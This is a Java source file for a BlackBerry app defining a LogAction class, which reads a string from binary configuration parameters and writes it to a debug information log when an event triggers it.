package blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.utils.WChar;

public class LogAction extends SubAction {

    //#ifdef DEBUG
    static Debug debug = new Debug("LogAction", DebugLevel.VERBOSE);
    //#endif

    private String info;

    public LogAction(int actionId) {
        super(actionId);
    }

    public LogAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {

        Debug.logToInfo(info, DebugLevel.INFORMATION);
        return true;
    }

    protected boolean parse(byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            final int len = databuffer.readInt();
            final byte[] buffer = new byte[len];
            databuffer.read(buffer);
            info = WChar.getString(buffer, true);

        } catch (final EOFException e) {
            return false;
        }

        return true;
    }

}
